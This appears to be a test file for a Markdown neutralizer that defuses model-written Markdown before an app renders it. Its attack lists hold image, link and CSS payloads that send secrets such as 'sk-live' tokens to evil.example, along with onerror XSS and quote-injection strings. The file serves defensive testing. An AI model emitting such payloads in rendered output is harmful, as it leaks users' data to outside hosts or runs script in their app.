import { describe, expect, test } from "bun:test"
import { createMarkdownParser } from "@opencode/ui/context/marked-parser"
import { Lexer } from "marked"
import {
  bareUrlScanner,
  defuse,
  JOINER,
  LINK_PREFIX,
  linkTarget,
  mathScanner,
  MAX_MARKDOWN_TEXT,
  neutralizeMarkdown,
  prepareMarkdown,
  splitMarkdown,
  stripJoiners,
} from "../../src/gui/components/markdown.ts"
import { seeded } from "./random.ts"

// The app renders ui.Markdown with this parser (@opencode/ui marked-base plus its code and math extensions), so the
// tests check what marked makes of the neutralized text.
const parser = createMarkdownParser()

/** What ui.Markdown would render for a model-written Markdown string, as MarkdownText prepares it. */
function render(text: string): string {
  return splitMarkdown(text)
    .map((part) =>
      part.kind === "code"
        ? `<pre data-ui-code>${part.code.replaceAll("&", "&amp;").replaceAll("<", "&lt;")}</pre>`
        : (parser.parse(neutralizeMarkdown(part.text, "Image"), { async: false }) as string),
    )
    .join("")
}

/** Tags marked and its code highlighting generate from Markdown syntax; anything else came from raw HTML. */
const MARKDOWN_TAGS = new Set(
  "p a em strong code pre ul ol li blockquote h1 h2 h3 h4 h5 h6 hr br table thead tbody tr th td del input span div".split(
    " ",
  ),
)

/**
 * The tags KaTeX writes for math (the app's renderer, not the text): its spans, MathML, and SVG for wide accents and
 * roots. Allowed inside KaTeX's own output only (see `mathTags`): the same tags anywhere else came from raw HTML, such
 * as `<svg><a href=…><path/></a></svg>` [review6#R10].
 */
const KATEX_TAGS = new Set(
  [
    "span math semantics mrow mi mn mo mtext mspace annotation msub msup msubsup mfrac msqrt mroot mstyle mpadded",
    "mphantom menclose munder mover munderover mtable mtr mtd mlabeledtr merror ms svg path line",
  ]
    .join(" ")
    .split(" "),
)

/**
 * Rendered HTML split into KaTeX's output (each `<span class="katex">` subtree, to its matching `</span>`) and the
 * rest, so each part is checked against its own tags.
 */
function splitMath(html: string): { readonly rest: string; readonly math: string[] } {
  const math: string[] = []
  let rest = ""
  let at = 0
  for (;;) {
    const start = html.indexOf('<span class="katex">', at)
    if (start === -1) break
    rest += html.slice(at, start)
    const tag = /<(\/?)span\b[^>]*>/g
    tag.lastIndex = start
    let depth = 0
    let end = html.length
    for (let match = tag.exec(html); match; match = tag.exec(html)) {
      depth += match[1] ? -1 : 1
      if (depth === 0) {
        end = tag.lastIndex
        break
      }
    }
    math.push(html.slice(start, end))
    at = end
  }
  return { rest: rest + html.slice(at), math }
}

/** The tags of rendered HTML that neither Markdown nor KaTeX writes, with where each was found. */
function foreignTags(html: string): string[] {
  const { rest, math } = splitMath(html)
  return [
    ...tags(rest)
      .filter((tag) => !MARKDOWN_TAGS.has(tag.name))
      .map((tag) => `<${tag.name}>`),
    ...math
      .flatMap(tags)
      .filter((tag) => !KATEX_TAGS.has(tag.name) || /\shref\s*=/i.test(tag.attributes))
      .map((tag) => `<${tag.name}${tag.attributes}> in KaTeX output`),
  ]
}

/** The real tags of rendered HTML (text from the source is escaped, so every `<` left starts a tag). */
function tags(html: string): { readonly name: string; readonly attributes: string }[] {
  return [...html.matchAll(/<\/?([a-zA-Z][\w-]*)([^>]*)>/g)].map((match) => ({
    name: match[1]!.toLowerCase(),
    attributes: match[2]!,
  }))
}

/** Attribute names as a browser reads them: a new attribute may start right after a quoted value. */
const attributeNames = (attributes: string) =>
  [...attributes.matchAll(/([^\s"'=<>`/]+)(?:\s*=\s*(?:"[^"]*"|'[^']*'|[^\s"'=<>`]+))?/g)].map((match) =>
    match[1]!.toLowerCase(),
  )

const decode = (text: string) =>
  text
    .replace(/&#(\d+);/g, (_, code: string) => String.fromCodePoint(Number(code)))
    .replace(/&#x([0-9a-f]+);/gi, (_, code: string) => String.fromCodePoint(Number.parseInt(code, 16)))
    .replace(/&quot;/g, '"')
    .replace(/&#39;/g, "'")
    .replace(/&lt;/g, "<")
    .replace(/&gt;/g, ">")
    .replace(/&amp;/g, "&")

const hrefs = (html: string) => [...html.matchAll(/<a\s[^>]*?href="([^"]*)"/g)].map((match) => decode(match[1]!))

/**
 * What the app would load for this HTML without a click: session-ui's Markdown (packages/session-ui/src/components/
 * markdown.tsx) turns inline code holding a URL into a link (`markCodeLinks`), then gives every `a.external-link` with
 * an http(s) address a favicon from a remote service (`markExternalLinkFavicons`); marked-base gives every link whose
 * href does not start with `#` that class. Returns the addresses it would decorate.
 */
function decorated(html: string): string[] {
  const loads: string[] = []
  const web = (href: string) => {
    try {
      // A relative href resolves against the app's own origin (oc://renderer/), which is never decorated.
      const url = new URL(href, "oc://renderer/index.html")
      return url.protocol === "http:" || url.protocol === "https:" ? url.href : undefined
    } catch {
      return undefined
    }
  }
  for (const match of html.matchAll(/<a\s([^>]*)>/g)) {
    const attributes = match[1]!
    const href = /href="([^"]*)"/.exec(attributes)?.[1]
    if (href === undefined || !/class="[^"]*external-link/.test(attributes)) continue
    const url = web(decode(href))
    if (url) loads.push(url)
  }
  for (const match of html.matchAll(/<code>([\s\S]*?)<\/code>/g)) {
    const text = decode(match[1]!.replace(/<[^>]+>/g, ""))
      .trim()
      .replace(/[),.;!?]+$/, "")
    if (/^https?:\/\/[^\s<>()`"']+$/.test(text)) loads.push(text)
  }
  return loads
}

/** Every link is one of genui's (an encoded address only) or an e-mail address the renderer linked itself. */
function expectOwnLinks(html: string) {
  for (const href of hrefs(html)) {
    const own = href.startsWith(LINK_PREFIX) && /^[A-Za-z0-9%_-]*$/.test(href.slice(LINK_PREFIX.length))
    expect(own || /^mailto:[A-Za-z0-9._+-]+@[A-Za-z0-9._-]+$/.test(href), `${href} in ${html}`).toBe(true)
  }
}

/** The visible text of rendered HTML, joiners dropped. */
const shown = (html: string) =>
  decode(stripJoiners(html).replace(/<[^>]+>/g, ""))
    .replace(/\s+/g, " ")
    .trim()

const ATTACKS = [
  "![x](https://evil.example/p.gif?d=secret)",
  "![](https://evil.example/p.gif)",
  'Status: ![ok](https://evil.example/p.gif "title")',
  "![x][r]\n\n[r]: https://evil.example/p.gif",
  "![r]\n\n[r]: https://evil.example/p.gif",
  "![r][]\n\n[r]: https://evil.example/p.gif",
  "!![x](https://evil.example/p.gif)",
  "!!!![x](https://evil.example/p.gif)",
  "\\![x](https://evil.example/p.gif)",
  "`code` ![x](https://evil.example/p.gif)",
  "[![x](https://evil.example/p.gif)](https://example.com)",
  "<img src=https://evil.example/p.gif>",
  "<IMG SRC=x onerror=alert(1)>",
  "</p><img src=x>",
  "<!-- c --><img src=x>",
  "<div>\n<img src=x>\n</div>",
  "<style>body{background:url(https://evil.example)}</style>",
  'a <span style="background:url(https://evil.example)">b</span>',
  "[a](https://e/`)<img src=x>`",
  "<https://a`>![x](u)`",
  "- item\n  ```\n  code\nnot indented <img src=x>",
  '[a]: https://x "title\n```"\n<img src=x>\n```',
  "~~~\n```\n~~~\n<img src=x>",
  "```js`\n<img src=x>\n```",
  "    indented\n<img src=x>",
  "> ```\n> <img src=x>",
  "| a |\n| - |\n| <img src=x> |",
  "<svg><image href=x></image></svg>",
  "<?xml version='1.0'?><img src=x>",
  "<![CDATA[x]]><img src=x>",
  "<!DOCTYPE html><img src=x>",
  "text\n```\n<img src=x>",
  "$x$ <img src=x> $y$",
  '<a href="https://evil.example">x</a>',
  "<iframe src=https://evil.example></iframe>",
  "<video poster=https://evil.example></video>",
  "<input type=image src=x>",
  "<object data=https://evil.example></object>",
  "<link rel=stylesheet href=https://evil.example>",
  "* <img src=x>\n* ![a](https://evil.example)",
  "# <img src=x>\n\n**<img src=x>**",
  "<img\nsrc=x>",
  "    ```\n<img src=x>\n    ```",
  "- ```\n  <img src=x>\n  ```\n<img src=y>",
]

// The app's link renderer writes href and title unescaped: a quote would end the attribute and add new ones.
const QUOTE_ATTACKS = [
  '[ok](https://x"style="background-image:url(https://evil.example/p.gif)")',
  '![ok](https://x"style="background-image:url(https://evil.example/p.gif?d=sk-live-123)")',
  "[ok](https://x 'a\" style=\"background:url(https://evil.example)')",
  '[ok](https://x (a" onfocus="alert(1)" autofocus="))',
  '[ok][r]\n\n[r]: https://x"style="background:url(https://evil.example)"',
  '[ok](#x"onmouseover="alert(1))',
  'see https://x"style="background:url(https://evil.example/p.gif)" now',
  '<https://x"style="background:url(https://evil.example/p.gif)">',
  'www.x.com/"style="background:url(https://evil.example/p.gif)"',
  '[a](https://x`"style="background:url(https://evil.example)"`)',
  '[a](https://x\\"style=\\"background:url(https://evil.example)\\")',
  '`x` [a](https://x"onmouseover="alert(1))',
  '[a](https://x "t&#34; onmouseover=&#34;alert(1)")',
  "[a](https://x 'it\\'s \" onfocus=\"x')",
]

// Every way a link reaches the app's renderer, with what a user types built into its host (a `$template` over a
// password field gives exactly this text on each keystroke).
const LINK_FORMS = [
  "Need help? See [the docs](https://sk-live-4f9a2c71.docs-cdn.net/setup).",
  "![hunter2](https://hunter2.docs-cdn.net/p.png)",
  "Use `https://acme-prod-token-77.docs-cdn.net/x` here, or ``https://t.docs-cdn.net/y``.",
  "Bare https://t0k3n.docs-cdn.net/a and www.t0k3n.docs-cdn.net and HTTPS://T0K3N.DOCS-CDN.NET.",
  "<https://sk-live-1.docs-cdn.net/a>",
  "[d][ref]\n\n[ref]: https://sk-live-2.docs-cdn.net/a",
  "[ref]\n\n[ref]: <https://sk-live-3.docs-cdn.net/a> 'x'",
  "[a](<https://sk-live-4.docs-cdn.net/a b>)",
  '[a](https://sk-live-5.docs-cdn.net/a "title")',
  "[a](https&#58;//sk-live-6.docs-cdn.net/a)",
  "[a](https\\://sk-live-7.docs-cdn.net/a)",
  "[a](  https://sk-live-8.docs-cdn.net/a  )",
  "[a](\nhttps://sk-live-9.docs-cdn.net/a\n)",
  "[a [nested] text](https://sk-live-10.docs-cdn.net/a)",
  "[`code` text](https://sk-live-11.docs-cdn.net/a)",
  "[a](https://sk-live-12.docs-cdn.net/(x))",
  "*[a](https://sk-live-13.docs-cdn.net/a)*",
  "| x |\n| - |\n| [a](https://sk-live-14.docs-cdn.net/a) https://sk-live-15.docs-cdn.net |",
  "> [a](https://sk-live-16.docs-cdn.net/a)\n> https://sk-live-17.docs-cdn.net",
  "- [a](https://sk-live-18.docs-cdn.net/a)\n  - https://sk-live-19.docs-cdn.net/b",
  "# Heading [a](https://sk-live-20.docs-cdn.net/a)",
  "x\\\nhttps://sk-live-21.docs-cdn.net/a",
  "[a]  (https://sk-live-22.docs-cdn.net/a)",
  "[unbalanced [a](https://sk-live-23.docs-cdn.net/a)",
  "[a](https://sk-live-24.docs-cdn.net/a) [b]",
  "\\[a](https://sk-live-25.docs-cdn.net/a)",
  "[a\\](https://sk-live-26.docs-cdn.net/a)",
  "foo[a](https://sk-live-27.docs-cdn.net/a)bar",
  "ftp://sk-live-28.docs-cdn.net/a and file://sk-live-29.docs-cdn.net/b",
  "x <https://sk-live-30.docs-cdn.net/a> `<https://sk-live-31.docs-cdn.net/b>`",
  "**https://sk-live-32.docs-cdn.net/a**",
  "(see https://sk-live-33.docs-cdn.net/a)",
  "Read [the docs](https://sk-live-34.docs-cdn.net/a), then ![chart](https://sk-live-35.docs-cdn.net/c.png).",
  "1. Step\n\n       https://sk-live-36.docs-cdn.net/a",
  "> ```\n> https://sk-live-37.docs-cdn.net/a\n> ```",
  "$x$ https://sk-live-38.docs-cdn.net/a $y$",
  "[a](//sk-live-39.docs-cdn.net/a)",
  "Term\n: https://sk-live-40.docs-cdn.net/a",
]

describe("neutralizeMarkdown", () => {
  test.each(ATTACKS)("renders no image and no raw HTML: %j", (attack) => {
    const html = render(attack)
    expect(foreignTags(html), html).toEqual([])
    for (const tag of tags(html)) {
      // Nothing that loads or runs anything (the highlighter's own <pre style> sets colors only).
      expect(tag.attributes, html).not.toMatch(/\s(src|srcset|poster|data|on\w+)\s*=|url\(/i)
    }
    expect(decorated(html)).toEqual([])
    expectOwnLinks(html)
  })

  test("the raw-HTML check allows KaTeX's MathML and SVG only inside KaTeX's output [review6#R10]", () => {
    const math = render("$\\sqrt{a}$ and $\\overrightarrow{AB}$")
    expect(tags(math).some((tag) => tag.name === "svg")).toBe(true)
    expect(foreignTags(math)).toEqual([])
    // The same tags as raw HTML, as a regression of the neutralizer would let them through.
    expect(foreignTags('<p><svg><a href="https://x.example/"><path d="M0"/></a></svg></p>')).toEqual([
      "<svg>",
      "<path>",
      "<svg>",
    ])
    expect(foreignTags("<p><math><mi>x</mi></math></p>")).toEqual(["<math>", "<mi>", "<mi>", "<math>"])
    // Inside KaTeX's output, a link or a tag KaTeX never writes is still caught.
    expect(foreignTags('<span class="katex"><svg><a href="https://x.example/"></a></svg></span>')).toEqual([
      '<a href="https://x.example/"> in KaTeX output',
      "<a> in KaTeX output",
    ])
  })

  test.each(QUOTE_ATTACKS)("a quote in a link cannot add attributes: %j", (attack) => {
    const html = render(attack)
    for (const tag of tags(html)) {
      const allowed = tag.name === "a" ? ["href", "title", "class", "target", "rel"] : ["class", "style"]
      expect(
        attributeNames(tag.attributes).filter((name) => !allowed.includes(name)),
        html,
      ).toEqual([])
    }
    expectOwnLinks(html)
  })

  // [review4-security#2], [review4-fidelity#2]
  test.each(LINK_FORMS)("hands the app no link it would decorate with a remote favicon: %j", (text) => {
    const html = render(text)
    expect(decorated(html), html).toEqual([])
    expectOwnLinks(html)
  })

  test("the app's decoration rules, as the test reads them, do flag the text as written", () => {
    // Without genui's neutralizing, these forms make the app load a favicon for the link's host.
    const raw = (text: string) => parser.parse(text, { async: false }) as string
    expect(decorated(raw(LINK_FORMS[0]!))).toEqual(["https://sk-live-4f9a2c71.docs-cdn.net/setup"])
    expect(decorated(raw(LINK_FORMS[2]!))).toEqual([
      "https://acme-prod-token-77.docs-cdn.net/x",
      "https://t.docs-cdn.net/y",
    ])
    expect(decorated(raw(LINK_FORMS[3]!)).length).toBeGreaterThanOrEqual(2)
    expect(decorated(raw(LINK_FORMS[5]!))).toEqual(["https://sk-live-2.docs-cdn.net/a"])
  })

  test("links keep working: genui's link carries the address, its title shows it", () => {
    const html = render('Read [the docs](https://example.com/docs "API reference").')
    expect(shown(html)).toBe("Read the docs.")
    const [href] = hrefs(html)
    expect(linkTarget(href!)).toBe("https://example.com/docs")
    expect(stripJoiners(decode(/title="([^"]*)"/.exec(html)![1]!))).toBe("API reference (https://example.com/docs)")
    expect(html).not.toContain("external-link")

    const forms: [string, string, string][] = [
      [
        "See [the report](<https://example.com/my report.pdf>).",
        "See the report.",
        "https://example.com/my%20report.pdf",
      ],
      ["Read [the docs][d].\n\n[d]: https://example.com/docs 'Docs'", "Read the docs.", "https://example.com/docs"],
      [
        'Read [the docs][d].\n\n[d]: https://example.com/docs "API reference"',
        "Read the docs.",
        "https://example.com/docs",
      ],
      ["Mail <support@example.com> for help.", "Mail support@example.com for help.", "mailto:support@example.com"],
      ["Docs: <https://example.com/a_b>", "Docs: https://example.com/a_b", "https://example.com/a_b"],
      ["Go to https://example.com/a_b_c, now.", "Go to https://example.com/a_b_c, now.", "https://example.com/a_b_c"],
      ["Or www.example.com/x.", "Or www.example.com/x.", "http://www.example.com/x"],
      ["[a](https://example.com/?q=1&amp;r=2)", "a", "https://example.com/?q=1&r=2"],
      ["[a](https://example.com/\\(x\\))", "a", "https://example.com/(x)"],
      ["[![build](https://ci.example.com/b.svg)](https://ci.example.com)", "build", "https://ci.example.com/"],
      ["See ![the logo](https://x.example/logo.png).", "See the logo.", "https://x.example/logo.png"],
      ["![](https://x.example/a.png)", "Image", "https://x.example/a.png"],
      ["Wow!![x](https://x.example/a.png)", "Wow!x", "https://x.example/a.png"],
    ]
    for (const [text, visible, target] of forms) {
      const out = render(text)
      expect(shown(out), text).toBe(visible)
      expect(hrefs(out).map(linkTarget), text).toEqual([target])
    }
  })

  test("unmatched brackets in ordinary prose never stop later links [review5#F1]", () => {
    // Scanning from every `[` used a budget for the whole run that about 50 of these spent, after which every later link
    // showed as raw `[text](url)`.
    const intervals = Array.from({ length: 200 }, (_, index) => `[${index}, ${index + 10})`).join(" ")
    const lines = Array.from({ length: 200 }, (_, index) => `values in [a${index}, b${index})`).join("\n")
    const ansi = Array.from({ length: 200 }, (_, index) => `\u001b[32mok ${index}\u001b[0m`).join("\n")
    const tokens = Array.from({ length: 3000 }, (_, index) => `x[${index}`).join(" ")
    for (const text of [intervals, lines, ansi, tokens]) {
      const out = render(`${text}\n\nSee [the docs](https://docs.example.com/intervals) for details.`)
      expect(hrefs(out).map(linkTarget), text.slice(0, 20)).toEqual(["https://docs.example.com/intervals"])
      expect(out).not.toContain("[the docs]")
      // In the same paragraph too.
      const same = render(`${text} See [the docs](https://docs.example.com/intervals).`)
      expect(hrefs(same).map(linkTarget), text.slice(0, 20)).toEqual(["https://docs.example.com/intervals"])
    }
    // Nesting, escapes and code spans still decide where a link text ends.
    const nested: [string, string, string[]][] = [
      ["[a [b] c](https://x.example/1)", "a [b] c", ["https://x.example/1"]],
      ["[a \\] b](https://x.example/2)", "a ] b", ["https://x.example/2"]],
      ["[a `]` b](https://x.example/3)", "a ] b", ["https://x.example/3"]],
      // A blank line ends the link text: the address after it is only a bare URL.
      ["[a\n\nb](https://x.example/4)", "[a b](https://x.example/4)", ["https://x.example/4"]],
      ["[0, 1) and [c](https://x.example/5)", "[0, 1) and c", ["https://x.example/5"]],
    ]
    for (const [text, visible, targets] of nested) {
      const out = render(text)
      expect(hrefs(out).map(linkTarget), text).toEqual(targets)
      if (targets.length > 0) expect(shown(out), text).toBe(visible)
    }
  })

  test("a reference image becomes a link like an inline one, without a stray `!` [review5#F7]", () => {
    const text = [
      "![alt](https://x.example/a.png) and ![ref][r] and ![coll][] and ![short] and ![][r] and ![x][missing]",
      "",
      "[r]: https://x.example/r.png",
      "[coll]: https://x.example/c.png",
      "[short]: https://x.example/s.png 'Short'",
    ].join("\n")
    const out = render(text)
    expect(shown(out)).toBe("alt and ref and coll and short and Image and ![x][missing]")
    expect(hrefs(out).map(linkTarget)).toEqual([
      "https://x.example/a.png",
      "https://x.example/r.png",
      "https://x.example/c.png",
      "https://x.example/s.png",
      "https://x.example/r.png",
    ])
    // A definition before its use, and one the link policy refuses.
    expect(hrefs(render("[d]: https://x.example/d.png\n\n![D][d]")).map(linkTarget)).toEqual([
      "https://x.example/d.png",
    ])
    expect(hrefs(render("![x][j]\n\n[j]: javascript:alert(1)")).map(linkTarget)).toEqual([""])
    expectOwnLinks(out)
  })

  test("an address the link policy refuses gives a link to nothing", () => {
    for (const text of ["[x](javascript:alert(1))", "[x](src/app.ts)", "[x](data:text/html,hi)", "[x]()"]) {
      const out = render(text)
      expect(hrefs(out).map(linkTarget), text).toEqual([""])
      expect(out).not.toContain("title=")
    }
    expect(linkTarget("#genui-link:%E0%A4%A")).toBe("")
    expect(linkTarget("#section")).toBeUndefined()
    expect(linkTarget("https://example.com")).toBeUndefined()
  })

  test("reads the same as without genui: quotes, entities in code, math, `!` before `[`, titles", () => {
    // [review4-correctness#1], [review4-correctness#2], [review4-correctness#8]
    expect(shown(render('Say "hi" to [the "team"](https://example.com)'))).toBe('Say "hi" to the "team"')
    expect(shown(render('Set `"mode": "fast"` and `say \\"hi\\"`'))).toBe('Set "mode": "fast" and say \\"hi\\"')
    expect(render("In HTML, write `&#34;` for a quote.")).toContain("<code>&amp;#34;</code>")
    expect(shown(render("All tests pass![1] See the log."))).toBe("All tests pass![1] See the log.")
    expect(shown(render('> ```js\n> console.log("hi")\n> ```'))).toBe('console.log("hi")')
    expect(render('$$\\text{"q"}$$')).toContain('<span class="mord">&quot;q&quot;</span>')
    // In math, constructs are broken with a space (KaTeX ignores it there) instead of a joiner (KaTeX warns about one).
    for (const math of ["$a<b$", "$$x<y$$", "\\(a<b\\)", "$$\na<b\n$$", "```math\na<b\n```"])
      expect(neutralizeMarkdown(math, "Image"), math).not.toContain(JOINER)
    expect(neutralizeMarkdown("$a<b$ but <b>", "Image")).toBe(`$a< b$ but <${JOINER}b>`)
    expect(shown(render("Use <kbd>Ctrl</kbd> or a <b>bold</b> word"))).toBe("Use <kbd>Ctrl</kbd> or a <b>bold</b> word")
    expect(shown(render("a < b and c > d"))).toBe("a < b and c > d")
    expect(render("Use `Array<string>` here")).toContain(`<code>Array&lt;${JOINER}string&gt;</code>`)
  })

  test("adds nothing to text without links, images, tags or addresses", () => {
    const text =
      "# Title\n\n- one\n- two\n\n| a | b |\n| - | - |\n| 1 | 2 |\n\nPlain **bold** _text_, `code` and 3 < 4."
    expect(neutralizeMarkdown(text, "Image")).toBe(text)
  })

  test("what genui writes stays inert even where marked does not read it as a link", () => {
    // A label marked cannot parse (deeper nesting) leaves genui's `](…)` as text: no address to decorate.
    for (const text of ["[a [b [c]] d](https://sk-live.docs-cdn.net/a)", "[a ` b](https://sk-live.docs-cdn.net/a)"]) {
      const html = render(text)
      expect(decorated(html), html).toEqual([])
      expectOwnLinks(html)
    }
  })

  test("random Markdown never reaches the renderer as a link, image or tag of its own", () => {
    const pieces = [
      "[",
      "]",
      "(",
      ")",
      "!",
      "<",
      ">",
      "`",
      "``",
      "\\",
      '"',
      "'",
      " ",
      "\n",
      "\n\n",
      "https://",
      "http://",
      "www.",
      "sk-live.docs-cdn.net",
      "evil.example/p.gif",
      "a",
      ":",
      "//",
      "/",
      "*",
      "_",
      "|",
      "&#58;",
      "&quot;",
      "#",
      "@",
      "x@y.com",
      "-",
      "\t",
      "    ",
      "```",
      "~~~",
      "> ",
      "- ",
      "1. ",
      "$",
      "img src=",
      "a href=",
      "]: ",
      "](",
      "![",
    ]
    const draw = seeded(20261120)
    const seen = new Set<string>()
    for (let round = 0; round < 3000; round++) {
      let text = ""
      const length = 4 + draw(40)
      for (let index = 0; index < length; index++) text += pieces[draw(pieces.length)]
      seen.add(text)
      const html = render(text)
      expect(decorated(html), JSON.stringify(text)).toEqual([])
      expectOwnLinks(html)
      expect(foreignTags(html), `${JSON.stringify(text)} -> ${html}`).toEqual([])
    }
    // [review5#S6] The texts are distinct (a generator that lost precision repeated 831 of them over and over).
    expect(seen.size).toBeGreaterThan(2950)
  })

  test("stays fast on text built to make the link scan quadratic", () => {
    for (const text of ["![a](".repeat(10_000), "[".repeat(50_000), "[`".repeat(25_000), "$$a$ ".repeat(10_000)]) {
      const start = performance.now()
      neutralizeMarkdown(text, "Image")
      expect(performance.now() - start, text.slice(0, 10)).toBeLessThan(2000)
    }
  })

  // [recheck#2] A tool-output block renders on the main thread with no click: each of these took seconds (the time
  // grew with the square of the length) and froze the window, or about a second for the brackets.
  test("stays fast on long lines built to make math, bare URL, escape and bracket scans quadratic", () => {
    const size = 200_000
    const fill = (unit: string) => unit.repeat(Math.ceil(size / unit.length))
    const cases = [
      fill("\\("),
      fill("$$a "),
      fill("$$\\$"),
      `$$a${fill("\\$")}`,
      `www.a${".".repeat(size)}`,
      `www.a${";".repeat(size)}`,
      `www.a${")".repeat(size)}`,
      fill("www.a("),
      fill("http://a("),
      `www.a${fill("&a;")}`,
      `${fill("\\\\")}x[a](https://example.com)`,
      fill("\n$$\n$$\n"),
      fill("\n\n$\n"),
      fill("[`a`](x) "),
      fill("\\( www.a. $$x [a]("),
      "[".repeat(5 * size),
      "![".repeat(2 * size),
    ]
    for (const text of cases) {
      const start = performance.now()
      for (const part of splitMarkdown(text)) if (part.kind === "markdown") neutralizeMarkdown(part.text, "Image")
      expect(performance.now() - start, JSON.stringify(text.slice(0, 12))).toBeLessThan(1000)
    }
  })

  test("reads inline math as the app's pattern does, from every start", () => {
    // The app's patterns (packages/ui/src/context/marked-parser.tsx), tried at each start without remembering failures.
    const dollar =
      /\$\$(?!\$)((?:\\.|[^\\\n])*?(?:\\.|[^\\\n$]))\$\$|\$(?=[^\s$])((?:\\.|[^\\\n$])*?(?:\\\S|[^\s\\$]))\$(?!\w)/y
    const paren = /\\\(((?:\\.|[^\\\n])*?)\\\)/y
    const pieces = ["$", "$$", "\\(", "\\)", "\\", "\\$", "a", " ", "\n", "\r", "\u2028", "_", "x$"]
    const draw = seeded(7)
    const seen = new Set<string>()
    for (let round = 0; round < 3000; round++) {
      let src = ""
      for (let count = 4 + draw(30); count > 0; count--) src += pieces[draw(pieces.length)]
      seen.add(src)
      const scan = mathScanner(src)
      for (let index = 0; index < src.length; index++) {
        const pattern = src[index] === "$" ? dollar : src.startsWith("\\(", index) ? paren : undefined
        if (!pattern) continue
        pattern.lastIndex = index
        const match = pattern.exec(src)
        expect(scan(index), `${JSON.stringify(src)} at ${index}`).toBe(match ? index + match[0].length : -1)
      }
    }
    expect(seen.size).toBeGreaterThan(2900)
  })

  test("ends a bare URL where marked does, after giving back trailing punctuation", () => {
    // marked's own `_backpedal`, applied until nothing changes (marked src/Tokenizer.ts `url`), on genui's bare URL
    // (marked's, stopping at `|` as well).
    const pedal = Lexer.rules.inline.gfm._backpedal
    const url = /(?:(?:[hH][tT][tT][pP][sS]?|[fF][tT][pP]):\/\/|www\.)(?:[a-zA-Z0-9-]+\.?)+[^\s<|]*/y
    const reference = (src: string, index: number) => {
      url.lastIndex = index
      let text = url.exec(src)?.[0]
      if (text === undefined) return -1
      let previous: string
      do {
        previous = text
        text = pedal.exec(text)?.[0] ?? ""
      } while (previous !== text)
      return index + text.length
    }
    const pieces = ["www.", "http://", "a", "-", ".", ",", ";", ":", "!", "?", "*", "_", "'", '"', "~", "(", ")"]
    const more = ["&", "&amp;", "&a1;", "/", " ", "|", "<", "é", "ww", "h"]
    const draw = seeded(11)
    const seen = new Set<string>()
    for (let round = 0; round < 5000; round++) {
      let src = ""
      for (let count = 2 + draw(24); count > 0; count--) {
        const set = draw(4) === 0 ? more : pieces
        src += set[draw(set.length)]
      }
      seen.add(src)
      const scan = bareUrlScanner(src)
      for (let index = 0; index < src.length; index++)
        expect(scan(index), `${JSON.stringify(src)} at ${index}`).toBe(reference(src, index))
    }
    expect(seen.size).toBeGreaterThan(4500)
  })

  test("defuse breaks every construct with an invisible joiner", () => {
    expect(defuse("<b> ](x) ]: ![ https://x www.y WWW.z")).toBe(
      `<${JOINER}b> ]${JOINER}(x) ]${JOINER}: !${JOINER}[ https:${JOINER}//x www${JOINER}.y WWW${JOINER}.z`,
    )
    expect(stripJoiners(defuse("<b> ](x) https://x"))).toBe("<b> ](x) https://x")
  })
})

describe("splitMarkdown", () => {
  test("splits fenced code blocks out, exactly as written", () => {
    expect(splitMarkdown("Intro\n\n```ts\nconst a: Array<string> = []\n```\n\nOutro")).toEqual([
      { kind: "markdown", text: "Intro\n" },
      { kind: "code", code: "const a: Array<string> = []", language: "ts" },
      { kind: "markdown", text: "\nOutro" },
    ])
    expect(splitMarkdown("~~~~\n```\nnested\n```\n~~~~")).toEqual([{ kind: "code", code: "```\nnested\n```" }])
    expect(splitMarkdown("text\n```sh\nunclosed")).toEqual([
      { kind: "markdown", text: "text" },
      { kind: "code", code: "unclosed", language: "sh" },
    ])
  })

  test("splits indented fences out too, without their indentation [review4-correctness#1]", () => {
    expect(splitMarkdown('1. Commit:\n\n   ```bash\n   git commit -m "Fix"\n   ```\n2. Push')).toEqual([
      { kind: "markdown", text: "1. Commit:\n" },
      { kind: "code", code: 'git commit -m "Fix"', language: "bash" },
      { kind: "markdown", text: "2. Push" },
    ])
    expect(splitMarkdown("Run:\n\n  ```bash\n  echo hi\n    indented\n  ```")).toEqual([
      { kind: "markdown", text: "Run:\n" },
      { kind: "code", code: "echo hi\n  indented", language: "bash" },
    ])
  })

  test("leaves math, quoted, list-marker and invalid fences in the Markdown", () => {
    const math = "```math\nx^2\n```"
    expect(splitMarkdown(math)).toEqual([{ kind: "markdown", text: math }])
    const quoted = '> ```js\n> console.log("hi")\n> ```\n\nAfter'
    expect(splitMarkdown(quoted)).toEqual([{ kind: "markdown", text: quoted }])
    // The closing fence of a fence that opens after a list marker does not open a new block.
    const marker = "- ```sh\n  npm i\n  ```\n- next"
    expect(splitMarkdown(marker)).toEqual([{ kind: "markdown", text: marker }])
    const invalid = "```js`\ncode\n```"
    expect(splitMarkdown(invalid)).toEqual([
      { kind: "markdown", text: "```js`\ncode" },
      { kind: "code", code: "" },
    ])
  })

  test("the joiner is U+2060", () => {
    expect(JOINER).toBe("\u2060")
    expect(stripJoiners(`a<${JOINER}b`)).toBe("a<b")
  })
})

describe("what the app's renderer does with a text is bounded [review8#R6S2-4]", () => {
  /** The HTML of a text as MarkdownText hands it to ui.Markdown (its parts sharing one budget), and how long it took. */
  function timed(text: string): { readonly html: string; readonly ms: number } {
    const started = performance.now()
    const html = prepareMarkdown(text, "Image")
      .map((part) => (part.kind === "markdown" ? (parser.parse(part.text, { async: false }) as string) : part.code))
      .join("")
    return { html, ms: performance.now() - started }
  }
  const strongs = (html: string) => html.split("<strong>").length - 1

  test("emphasis runs that never close cost a bounded amount, and show as the characters", () => {
    // marked scans the rest of the paragraph for each run's closing delimiter: 13 s for "**a " × 8,000 (32 KB) before.
    for (const text of [
      "**a ".repeat(8000),
      "*a ".repeat(10_000),
      "_a ".repeat(10_000),
      "~a ".repeat(10_000),
      "*a\n".repeat(10_000),
    ]) {
      const { html, ms } = timed(text)
      expect(ms, text.slice(0, 8)).toBeLessThan(800)
      expect(
        html
          .replace(/<[^>]+>/g, "")
          .replaceAll("&#42;", "*")
          .replaceAll("&#95;", "_")
          .replaceAll("&#126;", "~"),
      ).toContain(text.slice(0, 40).trim().split("\n")[0] ?? "")
    }
    // So do many paragraphs of them, or many parts: they share the text's budget.
    expect(timed(`${"**a ".repeat(400)}\n\n`.repeat(25)).ms).toBeLessThan(800)
    expect(timed(`${"**a ".repeat(300)}\n\n\`\`\`\nx\n\`\`\`\n\n`.repeat(30)).ms).toBeLessThan(800)
  })

  test("ordinary emphasis is kept: a list of 300 bold items", () => {
    const list = Array.from({ length: 300 }, (_, index) => `- **Item ${index}**: what it does, in a few words`).join(
      "\n",
    )
    expect(strongs(timed(list).html)).toBe(300)
